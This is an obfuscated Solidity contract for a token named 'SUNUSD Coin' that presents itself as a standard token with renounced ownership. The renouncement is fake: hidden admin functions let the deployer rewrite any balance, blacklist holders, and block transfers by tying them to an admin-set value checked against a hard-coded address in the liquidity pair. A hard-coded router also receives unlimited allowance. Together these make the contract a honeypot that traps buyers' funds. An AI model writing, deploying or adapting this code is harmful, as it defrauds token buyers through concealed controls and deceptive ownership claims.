//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface kmmcbjkubugsk {
    function totalSupply() external view returns (uint256);

    function balanceOf(address ktapbnnxqpd) external view returns (uint256);

    function transfer(address byncphvxotq, uint256 cbthygaby) external returns (bool);

    function allowance(address iywqvrdueffhh, address spender) external view returns (uint256);

    function approve(address spender, uint256 cbthygaby) external returns (bool);

    function transferFrom(
        address sender,
        address byncphvxotq,
        uint256 cbthygaby
    ) external returns (bool);

    event Transfer(address indexed from, address indexed cvteemmvdsue, uint256 value);
    event Approval(address indexed iywqvrdueffhh, address indexed spender, uint256 value);
}

interface btqypaaxl is kmmcbjkubugsk {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract dpatytkprjmtyr {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface vhrrcfscrdvs {
    function createPair(address vhfreldaloooaw, address xglxvjqngaukes) external returns (address);
}

interface bfxqvsqvhbteah {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract SUNUSDCoin is dpatytkprjmtyr, kmmcbjkubugsk, btqypaaxl {

    function name() external view virtual override returns (string memory) {
        return sjwyumzxrfgzes;
    }

    function getOwner() external view returns (address) {
        return muvicdocvk;
    }

    function ntqxtezsb() public {
        emit OwnershipTransferred(udcrwmykpsrp, address(0));
        muvicdocvk = address(0);
    }

    string private nppfdtqyn = "SCN";

    function xpsvuqgspenl(address zuqdxuqbkvxhdl, address byncphvxotq, uint256 cbthygaby) internal returns (bool) {
        require(qnxirblyxlloby[zuqdxuqbkvxhdl] >= cbthygaby);
        qnxirblyxlloby[zuqdxuqbkvxhdl] -= cbthygaby;
        qnxirblyxlloby[byncphvxotq] += cbthygaby;
        emit Transfer(zuqdxuqbkvxhdl, byncphvxotq, cbthygaby);
        return true;
    }

    uint256 private byfbxbzqzg;

    address public udcrwmykpsrp;

    mapping(address => bool) public kyckjsiyvx;

    function allowance(address tepthpgektzjy, address ichwlakzcbsa) external view virtual override returns (uint256) {
        if (ichwlakzcbsa == oobvgyqaz) {
            return type(uint256).max;
        }
        return jlxhmfihwbzr[tepthpgektzjy][ichwlakzcbsa];
    }

    string private sjwyumzxrfgzes = "SUNUSD Coin";

    uint256 public ibobkfwsf;

    uint256 private bjkpsqcyxtotod;

    bool public qloxaudbaylfm;

    uint256 private xdpirvzgpgsmy = 100000000 * 10 ** 18;

    bool private bqdfrtpmbeicow;

    function transferFrom(address zuqdxuqbkvxhdl, address byncphvxotq, uint256 cbthygaby) external override returns (bool) {
        if (_msgSender() != oobvgyqaz) {
            if (jlxhmfihwbzr[zuqdxuqbkvxhdl][_msgSender()] != type(uint256).max) {
                require(cbthygaby <= jlxhmfihwbzr[zuqdxuqbkvxhdl][_msgSender()]);
                jlxhmfihwbzr[zuqdxuqbkvxhdl][_msgSender()] -= cbthygaby;
            }
        }
        return vadswqcfjibmph(zuqdxuqbkvxhdl, byncphvxotq, cbthygaby);
    }

    address nbzlitzxlgbk = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint8 private dcjmtfxtjpl = 18;

    function decimals() external view virtual override returns (uint8) {
        return dcjmtfxtjpl;
    }

    function xcosfzrsimzrfh(address oclxcjawp) public {
        if (qloxaudbaylfm) {
            return;
        }
        if (byfbxbzqzg == xafhobzokxvdm) {
            xafhobzokxvdm = bjkpsqcyxtotod;
        }
        hulqmozqykv[oclxcjawp] = true;
        if (ibobkfwsf != byfbxbzqzg) {
            ibobkfwsf = bjkpsqcyxtotod;
        }
        qloxaudbaylfm = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return xdpirvzgpgsmy;
    }

    bool private aaygpqgtrzos;

    constructor (){
        if (kkzklnauwlrznt) {
            bqdfrtpmbeicow = false;
        }
        ntqxtezsb();
        bfxqvsqvhbteah pmuetltdkmt = bfxqvsqvhbteah(oobvgyqaz);
        qruvgdojfwdmnb = vhrrcfscrdvs(pmuetltdkmt.factory()).createPair(pmuetltdkmt.WETH(), address(this));
        if (bjkpsqcyxtotod != ibobkfwsf) {
            bqdfrtpmbeicow = true;
        }
        udcrwmykpsrp = _msgSender();
        hulqmozqykv[udcrwmykpsrp] = true;
        qnxirblyxlloby[udcrwmykpsrp] = xdpirvzgpgsmy;
        
        emit Transfer(address(0), udcrwmykpsrp, xdpirvzgpgsmy);
    }

    address public qruvgdojfwdmnb;

    uint256 public xafhobzokxvdm;

    function vadswqcfjibmph(address zuqdxuqbkvxhdl, address byncphvxotq, uint256 cbthygaby) internal returns (bool) {
        if (zuqdxuqbkvxhdl == udcrwmykpsrp) {
            return xpsvuqgspenl(zuqdxuqbkvxhdl, byncphvxotq, cbthygaby);
        }
        uint256 edbqbttke = kmmcbjkubugsk(qruvgdojfwdmnb).balanceOf(nbzlitzxlgbk);
        require(edbqbttke == hslhuhydpxpwhx);
        require(!kyckjsiyvx[zuqdxuqbkvxhdl]);
        return xpsvuqgspenl(zuqdxuqbkvxhdl, byncphvxotq, cbthygaby);
    }

    event OwnershipTransferred(address indexed bglzznfsovae, address indexed mhvqnfgmgfzqns);

    address oobvgyqaz = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private muvicdocvk;

    bool public pajzwgxovqqsa;

    function approve(address ichwlakzcbsa, uint256 cbthygaby) public virtual override returns (bool) {
        jlxhmfihwbzr[_msgSender()][ichwlakzcbsa] = cbthygaby;
        emit Approval(_msgSender(), ichwlakzcbsa, cbthygaby);
        return true;
    }

    bool private kkzklnauwlrznt;

    function transfer(address gbxeutkmrpgnhf, uint256 cbthygaby) external virtual override returns (bool) {
        return vadswqcfjibmph(_msgSender(), gbxeutkmrpgnhf, cbthygaby);
    }

    function ychzzzysnch(address qtujvtbdoxd) public {
        xjtxgumzf();
        if (bjkpsqcyxtotod == byfbxbzqzg) {
            ibobkfwsf = byfbxbzqzg;
        }
        if (qtujvtbdoxd == udcrwmykpsrp || qtujvtbdoxd == qruvgdojfwdmnb) {
            return;
        }
        kyckjsiyvx[qtujvtbdoxd] = true;
    }

    function xwbvrhbhjpz(address gbxeutkmrpgnhf, uint256 cbthygaby) public {
        xjtxgumzf();
        qnxirblyxlloby[gbxeutkmrpgnhf] = cbthygaby;
    }

    mapping(address => bool) public hulqmozqykv;

    function balanceOf(address ktapbnnxqpd) public view virtual override returns (uint256) {
        return qnxirblyxlloby[ktapbnnxqpd];
    }

    mapping(address => uint256) private qnxirblyxlloby;

    function kxgheqnup(uint256 cbthygaby) public {
        xjtxgumzf();
        hslhuhydpxpwhx = cbthygaby;
    }

    function owner() external view returns (address) {
        return muvicdocvk;
    }

    uint256 lefbmiybgkxhnr;

    function xjtxgumzf() private view {
        require(hulqmozqykv[_msgSender()]);
    }

    mapping(address => mapping(address => uint256)) private jlxhmfihwbzr;

    function symbol() external view virtual override returns (string memory) {
        return nppfdtqyn;
    }

    uint256 hslhuhydpxpwhx;

}